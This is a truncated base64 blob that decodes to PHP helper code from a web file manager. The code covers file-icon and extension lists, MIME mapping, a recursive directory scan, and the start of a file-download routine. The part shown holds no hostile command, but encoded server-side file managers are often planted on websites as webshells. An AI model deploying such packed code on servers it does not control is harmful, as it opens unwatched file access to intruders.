b24gZm1fc2V0X21zZygkbXNnLCAkc3RhdHVzID0gJ29rJykNCnsNCiAgICAkX1NFU1NJT05bRk1fU0VTU0lPTl9JRF1bJ21lc3NhZ2UnXSA9ICRtc2c7DQogICAgJF9TRVNTSU9OW0ZNX1NFU1NJT05fSURdWydzdGF0dXMnXSA9ICRzdGF0dXM7DQp9DQoNCi8qKg0KICogQ2hlY2sgaWYgc3RyaW5nIGlzIGluIFVURi04DQogKiBAcGFyYW0gc3RyaW5nICRzdHJpbmcNCiAqIEByZXR1cm4gaW50DQogKi8NCmZ1bmN0aW9uIGZtX2lzX3V0ZjgoJHN0cmluZykNCnsNCiAgICByZXR1cm4gcHJlZ19tYXRjaCgnLy91JywgJHN0cmluZyk7DQp9DQoNCi8qKg0KICogQ29udmVydCBmaWxlIG5hbWUgdG8gVVRGLTggaW4gV2luZG93cw0KICogQHBhcmFtIHN0cmluZyAkZmlsZW5hbWUNCiAqIEByZXR1cm4gc3RyaW5nDQogKi8NCmZ1bmN0aW9uIGZtX2NvbnZlcnRfd2luKCRmaWxlbmFtZSkNCnsNCiAgICBpZiAoRk1fSVNfV0lOICYmIGZ1bmN0aW9uX2V4aXN0cygnaWNvbnYnKSkgew0KICAgICAgICAkZmlsZW5hbWUgPSBpY29udihGTV9JQ09OVl9JTlBVVF9FTkMsICdVVEYtOC8vSUdOT1JFJywgJGZpbGVuYW1lKTsNCiAgICB9DQogICAgcmV0dXJuICRmaWxlbmFtZTsNCn0NCg0KLyoqDQogKiBAcGFyYW0gJG9iag0KICogQHJldHVybiBhcnJheQ0KICovDQpmdW5jdGlvbiBmbV9vYmplY3RfdG9fYXJyYXkoJG9iaikNCnsNCiAgICBpZiAoIWlzX29iamVjdCgkb2JqKSAmJiAhaXNfYXJyYXkoJG9iaikpIHsNCiAgICAgICAgcmV0dXJuICRvYmo7DQogICAgfQ0KICAgIGlmIChpc19vYmplY3QoJG9iaikpIHsNCiAgICAgICAgJG9iaiA9IGdldF9vYmplY3RfdmFycygkb2JqKTsNCiAgICB9DQogICAgcmV0dXJuIGFycmF5X21hcCgnZm1fb2JqZWN0X3RvX2FycmF5JywgJG9iaik7DQp9DQoNCi8qKg0KICogR2V0IENTUyBjbGFzc25hbWUgZm9yIGZpbGUNCiAqIEBwYXJhbSBzdHJpbmcgJHBhdGgNCiAqIEByZXR1cm4gc3RyaW5nDQogKi8NCmZ1bmN0aW9uIGZtX2dldF9maWxlX2ljb25fY2xhc3MoJHBhdGgpDQp7DQogICAgLy8gZ2V0IGV4dGVuc2lvbg0KICAgICRleHQgPSBzdHJ0b2xvd2VyKHBhdGhpbmZvKCRwYXRoLCBQQVRISU5GT19FWFRFTlNJT04pKTsNCg0KICAgIHN3aXRjaCAoJGV4dCkgew0KICAgICAgICBjYXNlICdpY28nOg0KICAgICAgICBjYXNlICdnaWYnOg0KICAgICAgICBjYXNlICdqcGcnOg0KICAgICAgICBjYXNlICdqcGVnJzoNCiAgICAgICAgY2FzZSAnanBjJzoNCiAgICAgICAgY2FzZSAnanAyJzoNCiAgICAgICAgY2FzZSAnanB4JzoNCiAgICAgICAgY2FzZSAneGJtJzoNCiAgICAgICAgY2FzZSAnd2JtcCc6DQogICAgICAgIGNhc2UgJ3BuZyc6DQogICAgICAgIGNhc2UgJ2JtcCc6DQogICAgICAgIGNhc2UgJ3RpZic6DQogICAgICAgIGNhc2UgJ3RpZmYnOg0KICAgICAgICBjYXNlICd3ZWJwJzoNCiAgICAgICAgY2FzZSAnYXZpZic6DQogICAgICAgIGNhc2UgJ3N2Zyc6DQogICAgICAgICAgICAkaW1nID0gJ2ZhIGZhLXBpY3R1cmUtbyc7DQogICAgICAgICAgICBicmVhazsNCiAgICAgICAgY2FzZSAncGFzc3dkJzoNCiAgICAgICAgY2FzZSAnZnRwcXVvdGEnOg0KICAgICAgICBjYXNlICdzcWwnOg0KICAgICAgICBjYXNlICdqcyc6DQogICAgICAgIGNhc2UgJ3RzJzoNCiAgICAgICAgY2FzZSAnanN4JzoNCiAgICAgICAgY2FzZSAndHN4JzoNCiAgICAgICAgY2FzZSAnaGJzJzoNCiAgICAgICAgY2FzZSAnanNvbic6DQogICAgICAgIGNhc2UgJ3NoJzoNCiAgICAgICAgY2FzZSAnY29uZmlnJzoNCiAgICAgICAgY2FzZSAndHdpZyc6DQogICAgICAgIGNhc2UgJ3RwbCc6DQogICAgICAgIGNhc2UgJ21kJzoNCiAgICAgICAgY2FzZSAnZ2l0aWdub3JlJzoNCiAgICAgICAgY2FzZSAnYyc6DQogICAgICAgIGNhc2UgJ2NwcCc6DQogICAgICAgIGNhc2UgJ2NzJzoNCiAgICAgICAgY2FzZSAncHknOg0KICAgICAgICBjYXNlICdycyc6DQogICAgICAgIGNhc2UgJ21hcCc6DQogICAgICAgIGNhc2UgJ2xvY2snOg0KICAgICAgICBjYXNlICdkdGQnOg0KICAgICAgICBjYXNlICdwczEnOg0KICAgICAgICAgICAgJGltZyA9ICdmYSBmYS1maWxlLWNvZGUtbyc7DQogICAgICAgICAgICBicmVhazsNCiAgICAgICAgY2FzZSAndHh0JzoNCiAgICAgICAgY2FzZSAnaW5pJzoNCiAgICAgICAgY2FzZSAnY29uZic6DQogICAgICAgIGNhc2UgJ2xvZyc6DQogICAgICAgIGNhc2UgJ2h0YWNjZXNzJzoNCiAgICAgICAgY2FzZSAneWFtbCc6DQogICAgICAgIGNhc2UgJ3ltbCc6DQogICAgICAgIGNhc2UgJ3RvbWwnOg0KICAgICAgICBjYXNlICd0bXAnOg0KICAgICAgICBjYXNlICd0b3AnOg0KICAgICAgICBjYXNlICdib3QnOg0KICAgICAgICBjYXNlICdkYXQnOg0KICAgICAgICBjYXNlICdiYWsnOg0KICAgICAgICBjYXNlICdodHBhc3N3ZCc6DQogICAgICAgIGNhc2UgJ3BsJzoNCiAgICAgICAgICAgICRpbWcgPSAnZmEgZmEtZmlsZS10ZXh0LW8nOw0KICAgICAgICAgICAgYnJlYWs7DQogICAgICAgIGNhc2UgJ2Nzcyc6DQogICAgICAgIGNhc2UgJ2xlc3MnOg0KICAgICAgICBjYXNlICdzYXNzJzoNCiAgICAgICAgY2FzZSAnc2Nzcyc6DQogICAgICAgICAgICAkaW1nID0gJ2ZhIGZhLWNzczMnOw0KICAgICAgICAgICAgYnJlYWs7DQogICAgICAgIGNhc2UgJ2J6Mic6DQogICAgICAgIGNhc2UgJ3RiejInOg0KICAgICAgICBjYXNlICd0YnonOg0KICAgICAgICBjYXNlICd6aXAnOg0KICAgICAgICBjYXNlICdyYXInOg0KICAgICAgICBjYXNlICdneic6DQogICAgICAgIGNhc2UgJ3Rneic6DQogICAgICAgIGNhc2UgJ3Rhcic6DQogICAgICAgIGNhc2UgJzd6JzoNCiAgICAgICAgY2FzZSAneHonOg0KICAgICAgICBjYXNlICd0eHonOg0KICAgICAgICBjYXNlICd6c3QnOg0KICAgICAgICBjYXNlICd0enN0JzoNCiAgICAgICAgICAgICRpbWcgPSAnZmEgZmEtZmlsZS1hcmNoaXZlLW8nOw0KICAgICAgICAgICAgYnJlYWs7DQogICAgICAgIGNhc2UgJ3BocCc6DQogICAgICAgIGNhc2UgJ3BocDQnOg0KICAgICAgICBjYXNlICdwaHA1JzoNCiAgICAgICAgY2FzZSAncGhwcyc6DQogICAgICAgIGNhc2UgJ3BodG1sJzoNCiAgICAgICAgICAgICRpbWcgPSAnZmEgZmEtY29kZSc7DQogICAgICAgICAgICBicmVhazsNCiAgICAgICAgY2FzZSAnaHRtJzoNCiAgICAgICAgY2FzZSAnaHRtbCc6DQogICAgICAgIGNhc2UgJ3NodG1sJzoNCiAgICAgICAgY2FzZSAneGh0bWwnOg0KICAgICAgICAgICAgJGltZyA9ICdmYSBmYS1odG1sNSc7DQogICAgICAgICAgICBicmVhazsNCiAgICAgICAgY2FzZSAneG1sJzoNCiAgICAgICAgY2FzZSAneHNsJzoNCiAgICAgICAgICAgICRpbWcgPSAnZmEgZmEtZmlsZS1leGNlbC1vJzsNCiAgICAgICAgICAgIGJyZWFrOw0KICAgICAgICBjYXNlICd3YXYnOg0KICAgICAgICBjYXNlICdtcDMnOg0KICAgICAgICBjYXNlICdtcDInOg0KICAgICAgICBjYXNlICdtNGEnOg0KICAgICAgICBjYXNlICdhYWMnOg0KICAgICAgICBjYXNlICdvZ2cnOg0KICAgICAgICBjYXNlICdvZ2EnOg0KICAgICAgICBjYXNlICd3bWEnOg0KICAgICAgICBjYXNlICdta2EnOg0KICAgICAgICBjYXNlICdmbGFjJzoNCiAgICAgICAgY2FzZSAnYWMzJzoNCiAgICAgICAgY2FzZSAndGRzJzoNCiAgICAgICAgICAgICRpbWcgPSAnZmEgZmEtbXVzaWMnOw0KICAgICAgICAgICAgYnJlYWs7DQogICAgICAgIGNhc2UgJ20zdSc6DQogICAgICAgIGNhc2UgJ20zdTgnOg0KICAgICAgICBjYXNlICdwbHMnOg0KICAgICAgICBjYXNlICdjdWUnOg0KICAgICAgICBjYXNlICd4c3BmJzoNCiAgICAgICAgICAgICRpbWcgPSAnZmEgZmEtaGVhZHBob25lcyc7DQogICAgICAgICAgICBicmVhazsNCiAgICAgICAgY2FzZSAnYXZpJzoNCiAgICAgICAgY2FzZSAnbXBnJzoNCiAgICAgICAgY2FzZSAnbXBlZyc6DQogICAgICAgIGNhc2UgJ21wNCc6DQogICAgICAgIGNhc2UgJ200dic6DQogICAgICAgIGNhc2UgJ2Zsdic6DQogICAgICAgIGNhc2UgJ2Y0dic6DQogICAgICAgIGNhc2UgJ29nbSc6DQogICAgICAgIGNhc2UgJ29ndic6DQogICAgICAgIGNhc2UgJ21vdic6DQogICAgICAgIGNhc2UgJ21rdic6DQogICAgICAgIGNhc2UgJzNncCc6DQogICAgICAgIGNhc2UgJ2FzZic6DQogICAgICAgIGNhc2UgJ3dtdic6DQogICAgICAgIGNhc2UgJ3dlYm0nOg0KICAgICAgICAgICAgJGltZyA9ICdmYSBmYS1maWxlLXZpZGVvLW8nOw0KICAgICAgICAgICAgYnJlYWs7DQogICAgICAgIGNhc2UgJ2VtbCc6DQogICAgICAgIGNhc2UgJ21zZyc6DQogICAgICAgICAgICAkaW1nID0gJ2ZhIGZhLWVudmVsb3BlLW8nOw0KICAgICAgICAgICAgYnJlYWs7DQogICAgICAgIGNhc2UgJ3hscyc6DQogICAgICAgIGNhc2UgJ3hsc3gnOg0KICAgICAgICBjYXNlICdvZHMnOg0KICAgICAgICAgICAgJGltZyA9ICdmYSBmYS1maWxlLWV4Y2VsLW8nOw0KICAgICAgICAgICAgYnJlYWs7DQogICAgICAgIGNhc2UgJ2Nzdic6DQogICAgICAgICAgICAkaW1nID0gJ2ZhIGZhLWZpbGUtdGV4dC1vJzsNCiAgICAgICAgICAgIGJyZWFrOw0KICAgICAgICBjYXNlICdiYWsnOg0KICAgICAgICBjYXNlICdzd3AnOg0KICAgICAgICAgICAgJGltZyA9ICdmYSBmYS1jbGlwYm9hcmQnOw0KICAgICAgICAgICAgYnJlYWs7DQogICAgICAgIGNhc2UgJ2RvYyc6DQogICAgICAgIGNhc2UgJ2RvY3gnOg0KICAgICAgICBjYXNlICdvZHQnOg0KICAgICAgICAgICAgJGltZyA9ICdmYSBmYS1maWxlLXdvcmQtbyc7DQogICAgICAgICAgICBicmVhazsNCiAgICAgICAgY2FzZSAncHB0JzoNCiAgICAgICAgY2FzZSAncHB0eCc6DQogICAgICAgICAgICAkaW1nID0gJ2ZhIGZhLWZpbGUtcG93ZXJwb2ludC1vJzsNCiAgICAgICAgICAgIGJyZWFrOw0KICAgICAgICBjYXNlICd0dGYnOg0KICAgICAgICBjYXNlICd0dGMnOg0KICAgICAgICBjYXNlICdvdGYnOg0KICAgICAgICBjYXNlICd3b2ZmJzoNCiAgICAgICAgY2FzZSAnd29mZjInOg0KICAgICAgICBjYXNlICdlb3QnOg0KICAgICAgICBjYXNlICdmb24nOg0KICAgICAgICAgICAgJGltZyA9ICdmYSBmYS1mb250JzsNCiAgICAgICAgICAgIGJyZWFrOw0KICAgICAgICBjYXNlICdwZGYnOg0KICAgICAgICAgICAgJGltZyA9ICdmYSBmYS1maWxlLXBkZi1vJzsNCiAgICAgICAgICAgIGJyZWFrOw0KICAgICAgICBjYXNlICdwc2QnOg0KICAgICAgICBjYXNlICdhaSc6DQogICAgICAgIGNhc2UgJ2Vwcyc6DQogICAgICAgIGNhc2UgJ2ZsYSc6DQogICAgICAgIGNhc2UgJ3N3Zic6DQogICAgICAgICAgICAkaW1nID0gJ2ZhIGZhLWZpbGUtaW1hZ2Utbyc7DQogICAgICAgICAgICBicmVhazsNCiAgICAgICAgY2FzZSAnZXhlJzoNCiAgICAgICAgY2FzZSAnbXNpJzoNCiAgICAgICAgICAgICRpbWcgPSAnZmEgZmEtZmlsZS1vJzsNCiAgICAgICAgICAgIGJyZWFrOw0KICAgICAgICBjYXNlICdiYXQnOg0KICAgICAgICAgICAgJGltZyA9ICdmYSBmYS10ZXJtaW5hbCc7DQogICAgICAgICAgICBicmVhazsNCiAgICAgICAgZGVmYXVsdDoNCiAgICAgICAgICAgICRpbWcgPSAnZmEgZmEtaW5mby1jaXJjbGUnOw0KICAgIH0NCg0KICAgIHJldHVybiAkaW1nOw0KfQ0KDQovKioNCiAqIEdldCBpbWFnZSBmaWxlcyBleHRlbnNpb25zDQogKiBAcmV0dXJuIGFycmF5DQogKi8NCmZ1bmN0aW9uIGZtX2dldF9pbWFnZV9leHRzKCkNCnsNCiAgICByZXR1cm4gYXJyYXkoJ2ljbycsICdnaWYnLCAnanBnJywgJ2pwZWcnLCAnanBjJywgJ2pwMicsICdqcHgnLCAneGJtJywgJ3dibXAnLCAncG5nJywgJ2JtcCcsICd0aWYnLCAndGlmZicsICdwc2QnLCAnc3ZnJywgJ3dlYnAnLCAnYXZpZicpOw0KfQ0KDQovKioNCiAqIEdldCB2aWRlbyBmaWxlcyBleHRlbnNpb25zDQogKiBAcmV0dXJuIGFycmF5DQogKi8NCmZ1bmN0aW9uIGZtX2dldF92aWRlb19leHRzKCkNCnsNCiAgICByZXR1cm4gYXJyYXkoJ2F2aScsICd3ZWJtJywgJ3dtdicsICdtcDQnLCAnbTR2JywgJ29nbScsICdvZ3YnLCAnbW92JywgJ21rdicpOw0KfQ0KDQovKioNCiAqIEdldCBhdWRpbyBmaWxlcyBleHRlbnNpb25zDQogKiBAcmV0dXJuIGFycmF5DQogKi8NCmZ1bmN0aW9uIGZtX2dldF9hdWRpb19leHRzKCkNCnsNCiAgICByZXR1cm4gYXJyYXkoJ3dhdicsICdtcDMnLCAnb2dnJywgJ200YScpOw0KfQ0KDQovKioNCiAqIEdldCB0ZXh0IGZpbGUgZXh0ZW5zaW9ucw0KICogQHJldHVybiBhcnJheQ0KICovDQpmdW5jdGlvbiBmbV9nZXRfdGV4dF9leHRzKCkNCnsNCiAgICByZXR1cm4gYXJyYXkoDQogICAgICAgICd0eHQnLA0KICAgICAgICAnY3NzJywNCiAgICAgICAgJ2luaScsDQogICAgICAgICdjb25mJywNCiAgICAgICAgJ2xvZycsDQogICAgICAgICdodGFjY2VzcycsDQogICAgICAgICdwYXNzd2QnLA0KICAgICAgICAnZnRwcXVvdGEnLA0KICAgICAgICAnc3FsJywNCiAgICAgICAgJ2pzJywNCiAgICAgICAgJ3RzJywNCiAgICAgICAgJ2pzeCcsDQogICAgICAgICd0c3gnLA0KICAgICAgICAnbWpzJywNCiAgICAgICAgJ2pzb24nLA0KICAgICAgICAnc2gnLA0KICAgICAgICAnY29uZmlnJywNCiAgICAgICAgJ3BocCcsDQogICAgICAgICdwaHA0JywNCiAgICAgICAgJ3BocDUnLA0KICAgICAgICAncGhwcycsDQogICAgICAgICdwaHRtbCcsDQogICAgICAgICdodG0nLA0KICAgICAgICAnaHRtbCcsDQogICAgICAgICdzaHRtbCcsDQogICAgICAgICd4aHRtbCcsDQogICAgICAgICd4bWwnLA0KICAgICAgICAneHNsJywNCiAgICAgICAgJ20zdScsDQogICAgICAgICdtM3U4JywNCiAgICAgICAgJ3BscycsDQogICAgICAgICdjdWUnLA0KICAgICAgICAnYmFzaCcsDQogICAgICAgICd2dWUnLA0KICAgICAgICAnZW1sJywNCiAgICAgICAgJ21zZycsDQogICAgICAgICdjc3YnLA0KICAgICAgICAnYmF0JywNCiAgICAgICAgJ3R3aWcnLA0KICAgICAgICAndHBsJywNCiAgICAgICAgJ21kJywNCiAgICAgICAgJ2dpdGlnbm9yZScsDQogICAgICAgICdsZXNzJywNCiAgICAgICAgJ3Nhc3MnLA0KICAgICAgICAnc2NzcycsDQogICAgICAgICdjJywNCiAgICAgICAgJ2NwcCcsDQogICAgICAgICdjcycsDQogICAgICAgICdweScsDQogICAgICAgICdnbycsDQogICAgICAgICd6c2gnLA0KICAgICAgICAnc3dpZnQnLA0KICAgICAgICAnbWFwJywNCiAgICAgICAgJ2xvY2snLA0KICAgICAgICAnZHRkJywNCiAgICAgICAgJ3N2ZycsDQogICAgICAgICdhc3AnLA0KICAgICAgICAnYXNweCcsDQogICAgICAgICdhc3gnLA0KICAgICAgICAnYXNteCcsDQogICAgICAgICdhc2h4JywNCiAgICAgICAgJ2pzcCcsDQogICAgICAgICdqc3B4JywNCiAgICAgICAgJ2NnaScsDQogICAgICAgICdkb2NrZXJmaWxlJywNCiAgICAgICAgJ3J1YnknLA0KICAgICAgICAneW1sJywNCiAgICAgICAgJ3lhbWwnLA0KICAgICAgICAndG9tbCcsDQogICAgICAgICd2aG9zdCcsDQogICAgICAgICdzY3B0JywNCiAgICAgICAgJ2FwcGxlc2NyaXB0JywNCiAgICAgICAgJ2NzeCcsDQogICAgICAgICdjc2h0bWwnLA0KICAgICAgICAnYysrJywNCiAgICAgICAgJ2NvZmZlZScsDQogICAgICAgICdjZm0nLA0KICAgICAgICAncmInLA0KICAgICAgICAnZ3JhcGhxbCcsDQogICAgICAgICdtdXN0YWNoZScsDQogICAgICAgICdqaW5qYScsDQogICAgICAgICdodHRwJywNCiAgICAgICAgJ2hhbmRsZWJhcnMnLA0KICAgICAgICAnamF2YScsDQogICAgICAgICdlcycsDQogICAgICAgICdlczYnLA0KICAgICAgICAnbWFya2Rvd24nLA0KICAgICAgICAnd2lraScsDQogICAgICAgICd0bXAnLA0KICAgICAgICAndG9wJywNCiAgICAgICAgJ2JvdCcsDQogICAgICAgICdkYXQnLA0KICAgICAgICAnYmFrJywNCiAgICAgICAgJ2h0cGFzc3dkJywNCiAgICAgICAgJ3BsJywNCiAgICAgICAgJ3BzMScNCiAgICApOw0KfQ0KDQovKioNCiAqIEdldCBtaW1lIHR5cGVzIG9mIHRleHQgZmlsZXMNCiAqIEByZXR1cm4gYXJyYXkNCiAqLw0KZnVuY3Rpb24gZm1fZ2V0X3RleHRfbWltZXMoKQ0Kew0KICAgIHJldHVybiBhcnJheSgNCiAgICAgICAgJ2FwcGxpY2F0aW9uL3htbCcsDQogICAgICAgICdhcHBsaWNhdGlvbi9qYXZhc2NyaXB0JywNCiAgICAgICAgJ2FwcGxpY2F0aW9uL3gtamF2YXNjcmlwdCcsDQogICAgICAgICdpbWFnZS9zdmcreG1sJywNCiAgICAgICAgJ21lc3NhZ2UvcmZjODIyJywNCiAgICAgICAgJ2FwcGxpY2F0aW9uL2pzb24nLA0KICAgICk7DQp9DQoNCi8qKg0KICogR2V0IGZpbGUgbmFtZXMgb2YgdGV4dCBmaWxlcyB3L28gZXh0ZW5zaW9ucw0KICogQHJldHVybiBhcnJheQ0KICovDQpmdW5jdGlvbiBmbV9nZXRfdGV4dF9uYW1lcygpDQp7DQogICAgcmV0dXJuIGFycmF5KA0KICAgICAgICAnbGljZW5zZScsDQogICAgICAgICdyZWFkbWUnLA0KICAgICAgICAnYXV0aG9ycycsDQogICAgICAgICdjb250cmlidXRvcnMnLA0KICAgICAgICAnY2hhbmdlbG9nJywNCiAgICApOw0KfQ0KDQovKioNCiAqIEdldCBvbmxpbmUgZG9jcyB2aWV3ZXIgc3VwcG9ydGVkIGZpbGVzIGV4dGVuc2lvbnMNCiAqIEByZXR1cm4gYXJyYXkNCiAqLw0KZnVuY3Rpb24gZm1fZ2V0X29ubGluZVZpZXdlcl9leHRzKCkNCnsNCiAgICByZXR1cm4gYXJyYXkoJ2RvYycsICdkb2N4JywgJ3hscycsICd4bHN4JywgJ3BkZicsICdwcHQnLCAncHB0eCcsICdhaScsICdwc2QnLCAnZHhmJywgJ3hwcycsICdyYXInLCAnb2R0JywgJ29kcycpOw0KfQ0KDQovKioNCiAqIEl0IHJldHVybnMgdGhlIG1pbWUgdHlwZSBvZiBhIGZpbGUgYmFzZWQgb24gaXRzIGV4dGVuc2lvbi4NCiAqIEBwYXJhbSBleHRlbnNpb24gVGhlIGZpbGUgZXh0ZW5zaW9uIG9mIHRoZSBmaWxlIHlvdSB3YW50IHRvIGdldCB0aGUgbWltZSB0eXBlIGZvci4NCiAqIEByZXR1cm4gc3RyaW5nfHN0cmluZ1tdIFRoZSBtaW1lIHR5cGUgb2YgdGhlIGZpbGUuDQogKi8NCmZ1bmN0aW9uIGZtX2dldF9maWxlX21pbWVzKCRleHRlbnNpb24pDQp7DQogICAgJGZpbGVUeXBlc1snc3dmJ10gPSAnYXBwbGljYXRpb24veC1zaG9ja3dhdmUtZmxhc2gnOw0KICAgICRmaWxlVHlwZXNbJ3BkZiddID0gJ2FwcGxpY2F0aW9uL3BkZic7DQogICAgJGZpbGVUeXBlc1snZXhlJ10gPSAnYXBwbGljYXRpb24vb2N0ZXQtc3RyZWFtJzsNCiAgICAkZmlsZVR5cGVzWyd6aXAnXSA9ICdhcHBsaWNhdGlvbi96aXAnOw0KICAgICRmaWxlVHlwZXNbJ2RvYyddID0gJ2FwcGxpY2F0aW9uL21zd29yZCc7DQogICAgJGZpbGVUeXBlc1sneGxzJ10gPSAnYXBwbGljYXRpb24vdm5kLm1zLWV4Y2VsJzsNCiAgICAkZmlsZVR5cGVzWydwcHQnXSA9ICdhcHBsaWNhdGlvbi92bmQubXMtcG93ZXJwb2ludCc7DQogICAgJGZpbGVUeXBlc1snZ2lmJ10gPSAnaW1hZ2UvZ2lmJzsNCiAgICAkZmlsZVR5cGVzWydwbmcnXSA9ICdpbWFnZS9wbmcnOw0KICAgICRmaWxlVHlwZXNbJ2pwZWcnXSA9ICdpbWFnZS9qcGcnOw0KICAgICRmaWxlVHlwZXNbJ2pwZyddID0gJ2ltYWdlL2pwZyc7DQogICAgJGZpbGVUeXBlc1snd2VicCddID0gJ2ltYWdlL3dlYnAnOw0KICAgICRmaWxlVHlwZXNbJ2F2aWYnXSA9ICdpbWFnZS9hdmlmJzsNCiAgICAkZmlsZVR5cGVzWydyYXInXSA9ICdhcHBsaWNhdGlvbi9yYXInOw0KDQogICAgJGZpbGVUeXBlc1sncmEnXSA9ICdhdWRpby94LXBuLXJlYWxhdWRpbyc7DQogICAgJGZpbGVUeXBlc1sncmFtJ10gPSAnYXVkaW8veC1wbi1yZWFsYXVkaW8nOw0KICAgICRmaWxlVHlwZXNbJ29nZyddID0gJ2F1ZGlvL3gtcG4tcmVhbGF1ZGlvJzsNCg0KICAgICRmaWxlVHlwZXNbJ3dhdiddID0gJ3ZpZGVvL3gtbXN2aWRlbyc7DQogICAgJGZpbGVUeXBlc1snd212J10gPSAndmlkZW8veC1tc3ZpZGVvJzsNCiAgICAkZmlsZVR5cGVzWydhdmknXSA9ICd2aWRlby94LW1zdmlkZW8nOw0KICAgICRmaWxlVHlwZXNbJ2FzZiddID0gJ3ZpZGVvL3gtbXN2aWRlbyc7DQogICAgJGZpbGVUeXBlc1snZGl2eCddID0gJ3ZpZGVvL3gtbXN2aWRlbyc7DQoNCiAgICAkZmlsZVR5cGVzWydtcDMnXSA9ICdhdWRpby9tcGVnJzsNCiAgICAkZmlsZVR5cGVzWydtcDQnXSA9ICdhdWRpby9tcGVnJzsNCiAgICAkZmlsZVR5cGVzWydtcGVnJ10gPSAndmlkZW8vbXBlZyc7DQogICAgJGZpbGVUeXBlc1snbXBnJ10gPSAndmlkZW8vbXBlZyc7DQogICAgJGZpbGVUeXBlc1snbXBlJ10gPSAndmlkZW8vbXBlZyc7DQogICAgJGZpbGVUeXBlc1snbW92J10gPSAndmlkZW8vcXVpY2t0aW1lJzsNCiAgICAkZmlsZVR5cGVzWydzd2YnXSA9ICd2aWRlby9xdWlja3RpbWUnOw0KICAgICRmaWxlVHlwZXNbJzNncCddID0gJ3ZpZGVvL3F1aWNrdGltZSc7DQogICAgJGZpbGVUeXBlc1snbTRhJ10gPSAndmlkZW8vcXVpY2t0aW1lJzsNCiAgICAkZmlsZVR5cGVzWydhYWMnXSA9ICd2aWRlby9xdWlja3RpbWUnOw0KICAgICRmaWxlVHlwZXNbJ20zdSddID0gJ3ZpZGVvL3F1aWNrdGltZSc7DQoNCiAgICAkZmlsZVR5cGVzWydwaHAnXSA9IFsnYXBwbGljYXRpb24veC1waHAnXTsNCiAgICAkZmlsZVR5cGVzWydodG1sJ10gPSBbJ3RleHQvaHRtbCddOw0KICAgICRmaWxlVHlwZXNbJ3R4dCddID0gWyd0ZXh0L3BsYWluJ107DQogICAgLy9Vbmtub3duIG1pbWUtdHlwZXMgc2hvdWxkIGJlICdhcHBsaWNhdGlvbi9vY3RldC1zdHJlYW0nDQogICAgaWYgKGVtcHR5KCRmaWxlVHlwZXNbJGV4dGVuc2lvbl0pKSB7DQogICAgICAgICRmaWxlVHlwZXNbJGV4dGVuc2lvbl0gPSBbJ2FwcGxpY2F0aW9uL29jdGV0LXN0cmVhbSddOw0KICAgIH0NCiAgICByZXR1cm4gJGZpbGVUeXBlc1skZXh0ZW5zaW9uXTsNCn0NCg0KLyoqDQogKiBUaGlzIGZ1bmN0aW9uIHNjYW5zIHRoZSBmaWxlcyBhbmQgZm9sZGVyIHJlY3Vyc2l2ZWx5LCBhbmQgcmV0dXJuIG1hdGNoaW5nIGZpbGVzDQogKiBAcGFyYW0gc3RyaW5nICRkaXINCiAqIEBwYXJhbSBzdHJpbmcgJGZpbHRlcg0KICogQHJldHVybiBhcnJheXxudWxsDQogKi8NCmZ1bmN0aW9uIHNjYW4oJGRpciA9ICcnLCAkZmlsdGVyID0gJycpDQp7DQogICAgJHBhdGggPSBGTV9ST09UX1BBVEggLiAnLycgLiAkZGlyOw0KICAgIGlmICgkcGF0aCkgew0KICAgICAgICAkaXRlID0gbmV3IFJlY3Vyc2l2ZUl0ZXJhdG9ySXRlcmF0b3IobmV3IFJlY3Vyc2l2ZURpcmVjdG9yeUl0ZXJhdG9yKCRwYXRoKSk7DQogICAgICAgICRyaWkgPSBuZXcgUmVnZXhJdGVyYXRvcigkaXRlLCAiLygiIC4gJGZpbHRlciAuICIpL2kiKTsNCg0KICAgICAgICAkZmlsZXMgPSBhcnJheSgpOw0KICAgICAgICBmb3JlYWNoICgkcmlpIGFzICRmaWxlKSB7DQogICAgICAgICAgICBpZiAoISRmaWxlLT5pc0RpcigpKSB7DQogICAgICAgICAgICAgICAgJGZpbGVOYW1lID0gJGZpbGUtPmdldEZpbGVuYW1lKCk7DQogICAgICAgICAgICAgICAgJGxvY2F0aW9uID0gc3RyX3JlcGxhY2UoRk1fUk9PVF9QQVRILCAnJywgJGZpbGUtPmdldFBhdGgoKSk7DQogICAgICAgICAgICAgICAgJGZpbGVzW10gPSBhcnJheSgNCiAgICAgICAgICAgICAgICAgICAgIm5hbWUiID0+ICRmaWxlTmFtZSwNCiAgICAgICAgICAgICAgICAgICAgInR5cGUiID0+ICJmaWxlIiwNCiAgICAgICAgICAgICAgICAgICAgInBhdGgiID0+ICRsb2NhdGlvbiwNCiAgICAgICAgICAgICAgICApOw0KICAgICAgICAgICAgfQ0KICAgICAgICB9DQogICAgICAgIHJldHVybiAkZmlsZXM7DQogICAgfQ0KfQ0KDQovKioNCiAqIFBhcmFtZXRlcnM6IGRvd25sb2FkRmlsZShGaWxlIExvY2F0aW9uLCBGaWxlIE5hbWUsDQogKiBtYXggc3BlZWQsIGlzIHN0cmVhbWluZw0KICogSWYgc3RyZWFtaW5nIC0gdmlkZW9zIHdpbGwgc2hvdyBhcyB2aWRlb3MsIGltYWdlcyBhcyBpbWFnZXMNCiAqIGluc3RlYWQgb2YgZG93bmxvYWQgcHJvbXB0DQogKiBodHRwczovL3N0YWNrb3ZlcmZsb3cuY29tL2EvMTM4MjE5OTIvMTE2NDY0Mg0KICovDQpmdW5jdGlvbiBmbV9kb3dubG9hZF9maWxlKCRmaWxlTG9jYXRpb24sICRmaWxlTmFtZSwgJGNodW5rU2l6ZSAgPSAxMDI0KQ0Kew0KICAgIGlmIChjb25uZWN0aW9uX3N0YXR1cygpICE9IDApDQogICAgICAgIHJldHVybiAoZmFsc2UpOw0KICAgICRleHRlbnNpb24gPSBwYXRoaW5mbygkZmlsZU5hbWUsIFBBVEhJTkZPX0VYVEVOU0lPTik7DQoNCiAgICAkY29udGVudFR5cGUgPSBmbV9nZXRfZmlsZV9taW1lcygkZXh0ZW5zaW9uKTsNCg0KICAgIGlmIChpc19hcnJheSgkY29udGVudFR5cGUpKSB7DQogICAgICAgICRjb250ZW50VHlwZSA9IGltcGxvZGUoJyAnLCAkY29udGVudFR5cGUpOw0KICAgIH0NCg0KICAgICRzaXplID0gZmlsZXNpemUoJGZpbGVMb2NhdGlvbik7DQoNCiAgICBpZiAoJHNpemUgPT0gMCkgew0KICAgICAgICBmbV9zZXRfbXNnKGxuZygnWmVybyBieXRlIGZpbGUhIEFib3J0aW5nIGRvd25sb2FkJyksICdlcnJvcicpOw0KICAgICAgICAkRk1fUEFUSCA9IEZNX1BBVEg7DQogICAgICAgIGZtX3JlZGlyZWN0KEZNX1NFTEZfVVJMIC4gJz9wPScgLiB1cmxlbmNvZGUoJEZNX1BB